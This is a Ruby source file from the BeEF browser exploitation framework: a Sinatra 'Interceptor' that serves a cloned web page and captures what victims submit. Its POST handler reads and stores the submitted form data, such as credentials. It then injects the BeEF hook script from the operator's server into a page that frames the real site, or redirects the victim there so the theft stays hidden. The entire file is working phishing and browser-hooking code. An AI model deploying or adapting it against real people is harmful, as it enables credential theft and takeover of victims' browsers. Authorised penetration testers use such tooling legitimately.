#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
module BeEF
  module Extension
    module SocialEngineering
      require 'sinatra/base'
      class Interceptor < Sinatra::Base

      configure do
          set :show_exceptions, false
      end

      # intercept GET
      get "/" do
        print_info "GET request"
        print_info "Referer: #{request.referer}"
        cloned_page = settings.cloned_page
        cloned_page
      end

      # intercept POST
      post "/" do
        print_info "POST request"
        request.body.rewind
        data = request.body.read
        print_info "Intercepted data:"
        print_info data

        interceptor_db = BeEF::Core::Models::Interceptor.new(
            :webcloner_id => settings.db_entry.id,
            :post_data => data
        )
        interceptor_db.save

        if settings.frameable
          print_info "Page can be framed :-) Loading original URL into iFrame..."
          "<html><head><script type=\"text/javascript\" src=\"#{settings.beef_hook}\"></script>\n</head></head><body><iframe src=\"#{settings.redirect_to}\" style=\"border:none; background-color:white; width:100%; height:100%; position:absolute; top:0px; left:0px; padding:0px; margin:0px\"></iframe></body></html>"
        else
          print_info "Page can not be framed :-) Redirecting to original URL..."
          redirect settings.redirect_to
        end
      end
      end
    end
  end
end

